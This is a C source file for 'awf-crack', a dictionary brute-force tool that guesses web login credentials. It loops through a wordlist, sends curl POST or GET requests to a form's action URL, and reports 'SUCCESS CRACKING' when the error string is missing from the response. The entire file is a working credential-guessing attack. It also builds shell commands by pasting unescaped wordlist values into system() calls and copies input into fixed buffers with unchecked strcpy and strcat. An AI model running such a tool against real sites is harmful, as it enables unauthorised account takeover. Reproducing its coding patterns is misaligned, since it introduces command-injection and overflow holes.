#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
char filter[] = " | findstr -C:\"";
#endif
#ifdef linux
char filter[] = " | grep \"";
#endif


int main(int argc, char const *argv[])
{
	if (argc == 1)
	{
		printf("\nUsage: awf-crack [options ...]\n");
		printf("\t-a [string]   signature of user-agent\n");
		printf("\t-d [file]     dictionary of keywords\n");
		printf("\t-u [string]   user field on tag name\n");
		printf("\t-k [string]   password field on tag name\n");
		printf("\t-h [string]   hidden field on tag name. Use \\\"\n");
		printf("\t-s [url]      URL from action form\n");
		printf("\t-e [string]   some string indicate error\n");
		printf("\t-n            don't process headers\n");
		printf("\t-v            verbose mode\n");
		printf("\t-c            enable cookies\n");
		printf("\t-g            force use GET\n");
		printf("\nExample: %s -d file_dic -u user_field -k key_field [-h hidden_fd=\\\"value\\\" ...] -s addr_action -e msgerror [-v]\n\n", argv[0]);
		exit(1);
	}

	int i;
	FILE *fd, *tmp;
	char uag[256], uf[100], kf[100], site[256], error[256], cmd[600];
	char hidd[10][256];
	int iH = 0, verb = 0, hasHs = 1, uagF = 0, cookie = 0, getF = 0;
	char cmdTail[256] = "";
	for (i = 1; i < argc; ++i)
	{
		if(strcmp(argv[i],"-d") == 0){
			if((fd = fopen(argv[i+1],"r")) == NULL){
				printf("Dicionario nao encontrado!");
				exit(1);
			}
		}
		else if(strcmp(argv[i],"-a") == 0){
			strcpy(uag, argv[i+1]);
			uagF = 1;
		}
		else if(strcmp(argv[i],"-s") == 0){
			strcpy(site, argv[i+1]);
		}
		else if(strcmp(argv[i],"-e") == 0){
			strcpy(error, argv[i+1]);
		}
		else if (strcmp(argv[i],"-u") == 0){
			strcpy(uf, argv[i+1]);
		}
		else if (strcmp(argv[i],"-k") == 0){
			strcpy(kf, argv[i+1]);
		}
		else if (strcmp(argv[i],"-h") == 0){
			strcpy(hidd[iH++], argv[i+1]);
		}
		else if (strcmp(argv[i],"-n") == 0){
			hasHs = 0;
		}
		else if (strcmp(argv[i],"-v") == 0){
			verb = 1;
		}
		else if (strcmp(argv[i],"-c") == 0){
			cookie = 1;
		}
		else if (strcmp(argv[i],"-g") == 0){
			getF = 1;
		}
	}
	
	if(hasHs) strcat(cmdTail, " 2>&1");
	else if(!verb){
		#ifdef _WIN32
		strcat(cmdTail, " 2>NUL");
		#elif linux
		strcat(cmdTail, " 2>/dev/null");
		#endif
	}
	strcat(cmdTail, filter);

	printf("\nUsing fields: %s and %s\n", uf, kf);
	char line[256], vu[256], vk[256];
	int fReading  = 1, altUK = 1;
	char ch;
	while(fReading){
		i = 0;
		do {
			ch = fgetc(fd);
			if(ch == EOF){
				fReading = 0;
				break;
			}
			else if(ch == '\r'){
				continue;
			}
			line[i] = (char) ch;
			i++;
		} while(ch != '\n');
		line[i-1] = '\0';
		if(line[0] != '#'){
			if(altUK){
				strcpy(vu,line);
				altUK = 0;
			}
			else {
				strcpy(vk,line);
				printf("Trying with   %s:\"%s\" and %s:\"%s\"\n", uf,vu,kf,vk);
				//printf("curl -X POST -s -v -d %s=\"%s\" -d %s=\"%s\" %s 2>NUL | findstr \"%s\" > _.tmp", uf, vu, kf, vk, site, error);
				cmd[0] = '\0';
				strcat(cmd,"curl");
				if(!getF){
					strcat(cmd, " -X POST");
				}
				if(cookie){
					strcat(cmd, " -b cookie.jar -c cookie.jar");
				}
				if(uagF){
					strcat(cmd, " -A \"");
					strcat(cmd, uag);
					strcat(cmd, "\"");
					
				}
				strcat(cmd," -s -v --data-urlencode ");
				strcat(cmd,uf);
				strcat(cmd,"=\"");
				strcat(cmd,vu);
				strcat(cmd,"\" --data-urlencode ");
				strcat(cmd,kf);
				strcat(cmd,"=\"");
				strcat(cmd,vk);
				strcat(cmd,"\"");
				int ii = iH;
				while((ii--) > 0){
					strcat(cmd," -d ");
					strcat(cmd,hidd[ii]);
				}
				strcat(cmd," ");
				strcat(cmd,site);
				strcat(cmd,cmdTail);
				strcat(cmd,error);
				strcat(cmd,"\" > _.tmp");
				system(cmd);
				///printf("%s\n", cmd); ////
				///exit(0); /////
				if(verb) fprintf(stderr, "* %s\n", cmd);
				if((tmp = fopen("_.tmp","r")) == NULL){
					printf("Error!!!\n");
					exit(2);
				}
				fseek(tmp, 0, SEEK_END);
				int aux = ftell(tmp);
				if(aux < 2){
					printf("SUCCESS CRACKING!!!\nUSER:\"%s\"\nKEY :\"%s\"\n",vu, vk);
					#ifdef _WIN32
					system("del _.tmp");
					#elif linux
					system("rm _.tmp");					
					#endif
					exit(0);
				}

				altUK = 1;
			}
		}
	}
	printf("\nDon't maked crack!!! =(\n");

	return 0;
}
